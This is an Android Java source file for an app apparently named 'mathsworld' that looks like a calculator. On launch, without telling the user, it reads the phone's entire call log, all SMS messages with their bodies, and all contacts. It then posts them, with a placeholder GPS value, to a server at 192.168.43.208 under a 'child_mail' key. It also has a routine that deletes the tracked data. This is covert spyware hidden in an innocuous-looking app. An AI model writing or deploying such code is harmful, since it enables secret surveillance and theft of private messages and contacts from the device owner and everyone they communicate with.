package com.tdz.mathsworld;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import androidx.core.app.ActivityCompat;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Date;

public class FirstActivity extends AppCompatActivity {

    public  static final int RequestPermissionCode  = 1 ;
    String call_log = "";
    String contact = "";
    String sms = "";
    String gps = "";
    public String child_mail  = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_first);



        Intent i = getIntent();
        child_mail = i.getStringExtra("child_mail");

        //clearData();

        getCallDetails(); //Call log is here
        getAllSms(FirstActivity.this); // sms is here
        getContacts();              //contact is here

        gps = "12.1212 13.12121";

        setData(call_log, contact, sms, gps);
    }

    private void setData(String call_log, String contact, String sms, String gps) {

        System.out.println("EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE");
        String type = "set";
        SetTrack setTrack = new SetTrack(this);
        setTrack.execute(type, child_mail, call_log, contact, sms, gps);


    }

    private void getAllSms(FirstActivity firstActivity) {
        StringBuffer sb = new StringBuffer();
        ContentResolver cr = firstActivity.getContentResolver();
        @SuppressLint({"NewApi", "LocalSuppress"})
        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;
        if (c != null) {
            totalSMS = c.getCount();
            if (c.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    Date dateFormat= new Date(Long.valueOf(smsDate));
                    String type;
                    switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            type = "inbox";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            type = "sent";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            type = "outbox";
                            break;
                        default:
                            break;
                    }


                    c.moveToNext();
                    sb.append( "\nPh No.: "+number +" \nContact: "+body+" \nDate: "+dateFormat );
                    sb.append("\n ### ");
                }

            }

            c.close();
            sms = sb.toString();

        } else {
            Toast.makeText(this, "No message to show!", Toast.LENGTH_SHORT).show();
        }
    }


    //CALL LOG IS HERE <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
    private void getCallDetails() {
        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = managedQuery( CallLog.Calls.CONTENT_URI,null, null,null, null);
        int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER );
        int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
        int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
        sb.append( "Call Details :");
        while ( managedCursor.moveToNext() ) {
            String phNumber = managedCursor.getString( number );
            String callType = managedCursor.getString( type );
            String callDate = managedCursor.getString( date );
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString( duration );
            String dir = null;
            int dircode = Integer.parseInt( callType );
            switch( dircode ) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append( "\nPh No : "+phNumber +" \nType : "+dir+
                    "\nDate : "+callDayTime+"\nTime : "+callDuration );
            sb.append("\n ### ");
            System.out.println(" Here! " + sb + " ######## ");
        }
        managedCursor.close();
        call_log = sb.toString();
    }


    //CLEAR DATA IS HERE <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
    private void clearData() {


        String type = "delete";
        DeleteTrack deleteTrack = new DeleteTrack(this);
        deleteTrack.execute(type, child_mail);

    }

    public void goToCalculator(View view) {
        Intent i = new Intent(FirstActivity.this,CalculatorActivity.class);
        startActivity(i);

    }

    public void goToScientific(View view) {
        Intent i = new Intent(FirstActivity.this,ScientificActivity.class);
        startActivity(i);

    }


    class DeleteTrack extends AsyncTask<String,Void,String> {
            Context context;

            private DeleteTrack(Context context) {
                this.context = context.getApplicationContext();
            }

            @Override
            protected String doInBackground(String... voids) {
                String type = voids[0];
                String child_login_url = "http://192.168.43.208/cts/child/delete_track.php";

                if(type.equals("delete")){
                    System.out.println("I'm in doInBackground ");
                    try {
                        String child_id = voids[1];

                        URL url = new URL(child_login_url);
                        HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
                        httpURLConnection.setRequestMethod("POST");
                        httpURLConnection.setDoInput(true);
                        httpURLConnection.setDoOutput(true);

                        OutputStream outputStream = httpURLConnection.getOutputStream();
                        BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream,"UTF-8"));


                        System.out.println("BBBBBBBBBBBBBBBBBBBBBBBB"+ child_id + "<<<<<");

                        String post_data = URLEncoder.encode("child_id","UTF-8")+"="+
                                URLEncoder.encode(child_id,"UTF-8");



                        System.out.println("POST_DATA " + post_data + " POST_DATA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
                        bufferedWriter.write(post_data);
                        bufferedWriter.flush();

                        bufferedWriter.close(); //write is close
                        outputStream.close();  // output stream close

                        InputStream inputStream = httpURLConnection.getInputStream();
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream,"UTF-8"));

                        String result = "";
                        String line = "";

                        while((line = bufferedReader.readLine()) != null){
                            result += line;
                            System.out.println(" > "+line + " <= is LINE ");
                        }

                        bufferedReader.close();
                        inputStream.close();
                        httpURLConnection.disconnect();

                        System.out.println(" > "+result + " <= is RESULT");
                        return result;

                    } catch (MalformedURLException e) {
                        System.out.println("URL Error  ");
                        e.printStackTrace();
                    } catch (IOException e) {
                        System.out.println("I/O Error in URL ");
                        e.printStackTrace();
                    }

                }
                return null;
            }

            @Override
            protected void onPreExecute() {

                System.out.println("I'm onPreExecute() ");
            }

            @Override
            protected void onPostExecute(String result) {

                System.out.println("I'm onPostExecute() ");
            }

            @Override
            protected void onProgressUpdate(Void... values) {
                System.out.println("I'm onProgressUpdate() ");
            }
        }


    //DATA INSERT IS HERE <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
    private class SetTrack extends AsyncTask<String,Void,String> {
        AlertDialog alertDialog;
        Context context;

        private SetTrack(Context context) {
            this.context = context.getApplicationContext();
        }


        protected String doInBackground(String... voids) {
            String type = voids[0];
            String child_login_url = "http://192.168.43.208/cts/child/set_track.php";

            System.out.println("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF");

            if(type.equals("set")){
                System.out.println("I'm in doInBackground ");
                try {
                    String child_mail = voids[1];
                    String call_log = voids[2];
                    String contact = voids[3];
                    String sms = voids[4];
                    String gps = voids[5];

                    URL url = new URL(child_login_url);
                    HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
                    httpURLConnection.setRequestMethod("POST");
                    httpURLConnection.setDoInput(true);
                    httpURLConnection.setDoOutput(true);

                    OutputStream outputStream = httpURLConnection.getOutputStream();
                    BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream,"UTF-8"));

                    String post_data = URLEncoder.encode("child_mail","UTF-8")+"="+
                            URLEncoder.encode(child_mail,"UTF-8")+"&"+

                            URLEncoder.encode("call_log","UTF-8")+"="+
                            URLEncoder.encode(call_log,"UTF-8")+"&"+

                            URLEncoder.encode("contact","UTF-8")+"="+
                            URLEncoder.encode(contact,"UTF-8")+"&"+

                            URLEncoder.encode("sms","UTF-8")+"="+
                            URLEncoder.encode(sms,"UTF-8")+"&"+

                            URLEncoder.encode("gps","UTF-8")+"="+
                            URLEncoder.encode(gps,"UTF-8");


                    System.out.println(call_log);
                    System.out.println( " **************** " + contact);
                    System.out.println( " **************** " + sms);
                    System.out.println( " **************** " + gps);

                    System.out.println("POST_DATA " + post_data + " POST_DATA");
                    bufferedWriter.write(post_data);
                    bufferedWriter.flush();

                    bufferedWriter.close(); //write is close
                    outputStream.close();  // output stream close

                    System.out.println("GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG");
                    InputStream inputStream = httpURLConnection.getInputStream();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream,"UTF-8"));

                    String result = "";
                    String line = "";

                    while((line = bufferedReader.readLine()) != null){
                        result += line;
                        System.out.println(" > "+line + " <= is LINE ");
                    }

                    bufferedReader.close();
                    inputStream.close();
                    httpURLConnection.disconnect();

                    System.out.println(" > "+result + " <= is RESULT");
                    return result;

                } catch (MalformedURLException e) {
                    System.out.println("URL Error  ");
                    e.printStackTrace();
                } catch (IOException e) {
                    System.out.println("I/O Error in URL ");
                    e.printStackTrace();
                }

            }
            return null;
        }


        protected void onPreExecute() {

            System.out.println("I'm onPreExecute() ");
        }


        protected void onPostExecute(String result) {
            System.out.println("Result is  " + result + " ");


            if(result.equals("Csuccess")) {

                //Toast.makeText(getApplicationContext(),"TRACK SET SUCCESSFUL",Toast.LENGTH_LONG).show();

            }
            else{
                //Toast.makeText(getApplicationContext(),"TRUCK SET ERROR",Toast.LENGTH_LONG).show();
            }

            System.out.println("I'm onPostExecute() ");
        }

        protected void onProgressUpdate(Void... values) {
            System.out.println("I'm onProgressUpdate() ");
        }
    }

    public void getContacts(){
        System.out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
        StringBuffer sb = new StringBuffer();
        Cursor cursor = null;
        cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,null, null, null);

        while (cursor.moveToNext()) {
            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phonenumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            sb.append("Name : " + name + "\nPh No. " + phonenumber + "\n");
            System.out.println(name + "+++++++++++++++++++++++++++++" + phonenumber);
        }

        cursor.close();
        contact = sb.toString();

    }

    public void EnableRuntimePermission(){

        if (ActivityCompat.shouldShowRequestPermissionRationale(
                FirstActivity.this, Manifest.permission.READ_CONTACTS))
        {

            Toast.makeText(FirstActivity.this,"CONTACTS permission allows us to Access CONTACTS app", Toast.LENGTH_LONG).show();

        } else {

            ActivityCompat.requestPermissions(FirstActivity.this,new String[]{
                    Manifest.permission.READ_CONTACTS}, RequestPermissionCode);

        }
    }

    @Override
    public void onRequestPermissionsResult(int RC, String per[], int[] PResult) {

        switch (RC) {

            case RequestPermissionCode:

                if (PResult.length > 0 && PResult[0] == PackageManager.PERMISSION_GRANTED) {

                    Toast.makeText(FirstActivity.this,"Permission Granted, Now your application can access CONTACTS.", Toast.LENGTH_LONG).show();

                } else {

                    Toast.makeText(FirstActivity.this,"Permission Canceled, Now your application cannot access CONTACTS.", Toast.LENGTH_LONG).show();

                }
                break;
        }
    }


}